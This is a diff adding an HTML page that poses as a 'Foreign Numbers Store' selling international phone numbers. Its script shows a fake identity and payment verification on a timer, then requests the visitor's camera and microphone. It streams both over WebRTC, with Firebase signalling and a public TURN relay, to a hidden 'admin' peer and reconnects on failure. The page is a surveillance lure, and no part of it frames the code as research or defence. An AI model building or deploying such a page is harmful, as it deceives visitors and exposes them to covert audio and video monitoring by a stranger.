@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Foreign Numbers Store</title>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #8b5cf6;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --error: #ef4444;
+            --bg-dark: #0f172a;
+            --bg-card: rgba(30, 41, 59, 0.7);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --border: rgba(148, 163, 184, 0.1);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #312e81 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated background particles */
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(99, 102, 241, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .container {
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.5),
+                0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.5), transparent);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .icon-wrapper {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 40px -10px rgba(99, 102, 241, 0.5);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .icon-wrapper svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+
+        h1 {
+            color: var(--text-primary);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        /* Progress Steps */
+        .progress-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 15px;
+            left: 15%;
+            right: 15%;
+            height: 2px;
+            background: rgba(148, 163, 184, 0.2);
+            z-index: 0;
+        }
+
+        .progress-line-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 1;
+            position: relative;
+        }
+
+        .step-number {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: rgba(30, 41, 59, 0.8);
+            border: 2px solid rgba(148, 163, 184, 0.3);
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .step.active .step-number {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-color: transparent;
+            color: white;
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.5);
+        }
+
+        .step.completed .step-number {
+            background: var(--success);
+            border-color: var(--success);
+            color: white;
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .step.active .step-label {
+            color: var(--text-primary);
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px 14px 48px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+            background: rgba(15, 23, 42, 0.8);
+        }
+
+        input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+            transition: color 0.3s ease;
+        }
+
+        input:focus + .input-icon,
+        .input-wrapper:focus-within .input-icon {
+            color: var(--primary);
+        }
+
+        /* Button Styles */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px -10px rgba(99, 102, 241, 0.5);
+        }
+
+        .submit-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-shine {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .submit-btn:hover .btn-shine {
+            left: 100%;
+        }
+
+        /* Status Messages */
+        .status-container {
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status-container.show {
+            display: flex;
+        }
+
+        .status-container.processing {
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+        }
+
+        .status-container.success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .status-container.error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .status-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .status-text {
+            color: var(--text-primary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid rgba(99, 102, 241, 0.3);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Features List */
+        .features {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border);
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .feature-item svg {
+            width: 20px;
+            height: 20px;
+            color: var(--success);
+            flex-shrink: 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-4.2-5.78V9.72c0-.67-.54-1.22-1.22-1.22s-1.22.55-1.22 1.22v3.5c0 .67.54 1.22 1.22 1.22s1.22-.55 1.22-1.22zm.32-6.63c0-.67-.54-1.22-1.22-1.22s-1.22.55-1.22 1.22.54 1.22 1.22 1.22 1.22-.55 1.22-1.22z"/>
+                </svg>
+            </div>
+            <h1>Foreign Numbers Store</h1>
+            <p class="subtitle">Get your international number instantly</p>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-line">
+                <div class="progress-line-fill" id="progressFill"></div>
+            </div>
+            <div class="step active" id="step1">
+                <div class="step-number">1</div>
+                <span class="step-label">Details</span>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-number">2</div>
+                <span class="step-label">Verify</span>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-number">3</div>
+                <span class="step-label">Connect</span>
+            </div>
+        </div>
+
+        <form id="buyForm">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="text" id="nameInput" placeholder="Your full name" required autocomplete="name">
+                    <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input type="email" id="emailInput" placeholder="Email address" required autocomplete="email">
+                    <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                        <polyline points="22,6 12,13 2,6"></polyline>
+                    </svg>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <span class="btn-shine"></span>
+                <span id="btnText">Get Number</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-left: 4px;">
+                    <line x1="5" y1="12" x2="19" y2="12"></line>
+                    <polyline points="12 5 19 12 12 19"></polyline>
+                </svg>
+            </button>
+        </form>
+
+        <div class="status-container" id="statusContainer">
+            <div class="spinner" id="statusSpinner"></div>
+            <svg class="status-icon" id="statusIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: none;">
+                <path id="statusIconPath" d="M20 6L9 17l-5-5"/>
+            </svg>
+            <span class="status-text" id="statusText">Processing your request...</span>
+        </div>
+
+        <div class="features">
+            <div class="feature-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+                <span>Instant activation worldwide</span>
+            </div>
+            <div class="feature-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span>Secure encrypted connection</span>
+            </div>
+            <div class="feature-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="16" x2="12" y2="12"></line>
+                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                </svg>
+                <span>24/7 customer support</span>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" charset="utf-8">
+        
+    
+    const firebaseConfig = {
+    apiKey: "AIzaSyAPTx0h7HNIEEI7a3Wrc9o_L6w2xzcUwtw",
+    authDomain: "playground-eed5e.firebaseapp.com",
+    projectId: "playground-eed5e"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+const form = document.getElementById('buyForm');
+const submitBtn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const statusContainer = document.getElementById('statusContainer');
+const statusText = document.getElementById('statusText');
+const statusSpinner = document.getElementById('statusSpinner');
+const statusIcon = document.getElementById('statusIcon');
+const statusIconPath = document.getElementById('statusIconPath');
+const progressFill = document.getElementById('progressFill');
+
+let pc;
+let sessionId;
+
+function updateStep(step) {
+    const steps = [1, 2, 3];
+    steps.forEach((s) => {
+        const el = document.getElementById(`step${s}`);
+        if (s < step) {
+            el.classList.remove('active');
+            el.classList.add('completed');
+            el.querySelector('.step-number').innerHTML = '✓';
+        } else if (s === step) {
+            el.classList.add('active');
+            el.classList.remove('completed');
+            el.querySelector('.step-number').textContent = s;
+        } else {
+            el.classList.remove('active', 'completed');
+            el.querySelector('.step-number').textContent = s;
+        }
+    });
+    progressFill.style.width = `${((step - 1) / 2) * 100}%`;
+}
+
+function showStatus(type, message) {
+    statusContainer.className = 'status-container show ' + type;
+    statusText.textContent = message;
+
+    if (type === 'processing') {
+        statusSpinner.style.display = 'block';
+        statusIcon.style.display = 'none';
+    } else {
+        statusSpinner.style.display = 'none';
+        statusIcon.style.display = 'block';
+
+        if (type === 'success') {
+            statusIconPath.setAttribute('d', 'M20 6L9 17l-5-5');
+        } else {
+            statusIconPath.setAttribute('d', 'M18 6L6 18M6 6l12 12');
+        }
+    }
+}
+
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    submitBtn.disabled = true;
+    btnText.textContent = 'Processing...';
+
+    updateStep(2);
+    showStatus('processing', 'Verifying your identity...');
+
+    setTimeout(() => {
+        updateStep(3);
+        showStatus('success', 'Payment verified! Connecting...');
+        btnText.textContent = 'Connected';
+
+        sessionId = "session_" + Math.random().toString(36).substring(2) + Date.now();
+        startConnection();
+    }, 1500);
+});
+
+async function startConnection() {
+
+    pc = new RTCPeerConnection({
+        iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+
+            // 🔥 TURN FIX
+            {
+                urls: "turn:openrelay.metered.ca:80",
+                username: "openrelayproject",
+                credential: "openrelayproject"
+            }
+        ]
+    });
+
+    const sessionRef = db.collection('sessions').doc(sessionId);
+    const offerRef = sessionRef.collection('offers').doc('offer');
+    const answerRef = sessionRef.collection('answers').doc('answer');
+    const userCandidates = sessionRef.collection('userCandidates');
+    const adminCandidates = sessionRef.collection('adminCandidates');
+
+    await sessionRef.set({
+        status: "waiting",
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    // ✅ REQUIRED: GET CAMERA
+    let stream;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
+        });
+    } catch (err) {
+        showStatus('error', 'Camera permission denied');
+        return;
+    }
+
+    // ✅ ADD TRACKS BEFORE OFFER
+    stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+    // ✅ SEND ICE
+    pc.onicecandidate = e => {
+        if (e.candidate) {
+            userCandidates.add({
+                candidate: e.candidate.toJSON()
+            });
+        }
+    };
+
+    let remoteReady = false;
+    let iceQueue = [];
+    const processed = new Set();
+
+    const unsubscribeCandidates = adminCandidates.onSnapshot(snapshot => {
+        snapshot.docChanges().forEach(change => {
+            if (change.type === "added") {
+                const data = change.doc.data();
+                if (!data?.candidate) return;
+
+                const key = JSON.stringify(data.candidate);
+                if (processed.has(key)) return;
+                processed.add(key);
+
+                const candidate = new RTCIceCandidate(data.candidate);
+
+                if (remoteReady) {
+                    pc.addIceCandidate(candidate).catch(()=>{});
+                } else {
+                    iceQueue.push(candidate);
+                }
+            }
+        });
+    });
+
+    // ✅ CREATE OFFER
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+
+    await offerRef.set({
+        type: offer.type,
+        sdp: offer.sdp
+    });
+
+    // ✅ RECEIVE ANSWER
+    const unsubscribeAnswer = answerRef.onSnapshot(async snap => {
+        if (snap.exists && !pc.currentRemoteDescription) {
+            const data = snap.data();
+
+            await pc.setRemoteDescription(
+                new RTCSessionDescription(data)
+            );
+
+            remoteReady = true;
+
+            iceQueue.forEach(c => pc.addIceCandidate(c).catch(()=>{}));
+            iceQueue = [];
+
+            showStatus('success', 'Connected successfully!');
+        }
+    });
+
+    // ✅ CONNECTION STATE
+    pc.onconnectionstatechange = () => {
+        const state = pc.connectionState;
+        console.log("STATE:", state);
+
+        if (state === "failed") {
+            showStatus('error', 'Reconnecting...');
+            unsubscribeCandidates();
+            unsubscribeAnswer();
+            pc.close();
+            setTimeout(startConnection, 1500);
+        }
+
+        if (state === "disconnected") {
+            showStatus('error', 'Disconnected...');
+        }
+    };
+}
+</script>
+
+</body>
+</html>
